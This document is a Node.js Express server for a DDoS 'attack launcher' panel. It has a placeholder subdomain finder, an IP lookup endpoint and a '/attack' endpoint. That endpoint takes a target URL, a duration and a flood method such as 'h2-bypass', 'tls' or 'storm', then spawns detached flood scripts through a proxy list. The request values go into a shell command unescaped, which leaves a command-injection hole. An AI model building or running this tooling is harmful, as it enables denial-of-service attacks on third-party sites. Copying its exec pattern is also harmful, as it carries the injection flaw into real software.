const express = require('express');
const { exec } = require('child_process');
const axios = require('axios');
const bodyParser = require('body-parser');
const app = express();

// Middleware
app.use(bodyParser.json());
app.use(express.static('public'));

// Subdomain Finder
app.get('/subfinder', (req, res) => {
  const domain = req.query.domain;
  if (!domain) return res.status(400).json({ message: "Domain is required" });

  // Example logic: Replace with actual subdomain finding process
  const subdomains = [`sub1.${domain}`, `sub2.${domain}`, `sub3.${domain}`]; // Dummy data
  res.json({ subdomains });
});

// Track IP
app.get('/trackip', (req, res) => {
  const ip = req.query.ip;
  if (!ip) return res.status(400).json({ message: "IP is required" });

  // Use a third-party API to track the IP
  axios.get(`http://ip-api.com/json/${ip}`)
    .then(response => {
      res.json(response.data);
    })
    .catch(error => {
      res.status(500).json({ message: "Error tracking IP" });
    });
});

// Attack Launcher
app.post('/attack', (req, res) => {
  const { url, time, method } = req.body;

  if (!url || !time || !method) {
    return res.status(400).json({ message: "All fields are required." });
  }

  // Call attack function
  initiateAttack(url, time, method)
    .then(message => {
      res.json({ message });
    })
    .catch(error => {
      console.error('Error initiating attack:', error);
      res.status(500).json({ message: 'Error executing attack.' });
    });
});

// Function to simulate attack (replace with actual logic)
function initiateAttack(url, time, method) {
  return new Promise((resolve, reject) => {
    const validMethods = [
      'flood', 'floodapi', 'floodvip', 'floodv2', 'tls', 'strike', 'hold', 'kill',
      'h2-bypass', 'storm', 'h2-flood', 'destroy', 'bypass', 'raw', 'thunder', 'ninja', 'glory'
    ];

    if (!validMethods.includes(method)) {
      return reject('Invalid attack method');
    }

    const command = `node ${method}.js ${url} ${time} 100 10 proxy.txt`; // Adjust command accordingly
    exec(command, { detached: true, stdio: 'ignore' }).unref();
    
    resolve(`Attack launched with method ${method} on ${url} for ${time} seconds.`);
  });
}

// Serve the HTML page
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});